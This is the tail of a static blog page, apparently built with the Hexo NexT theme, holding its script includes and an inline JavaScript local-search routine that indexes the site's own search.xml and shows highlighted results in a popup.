    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  


  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  

  

  
  

  

  

  

</body>
</html>
